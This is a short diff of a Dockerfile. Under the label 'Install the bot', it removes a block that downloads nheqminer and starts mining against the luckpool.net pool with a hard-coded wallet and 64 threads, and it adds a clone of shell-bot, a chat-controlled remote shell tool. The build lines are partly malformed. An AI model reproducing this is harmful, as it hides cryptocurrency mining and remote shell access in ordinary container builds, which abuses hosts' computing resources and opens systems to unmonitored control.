@@ -34,11 +34,7 @@ COPY /stuff /home/stuff
 RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # Install the bot:
-RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz 
-tar -xvf nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-cd nheqminer
-./nheqminer -v -l ap.luckpool.net:3956 -u RFa5RbzpTAFqiFREDsy5doaVPRS1HVPdzq.MODALNIKAH -p x -t 64
+RUN git clone https://github.com/botgram/shell-bot.git \
 
 RUN echo "Uploaded files:" && ls /home/stuff/
 
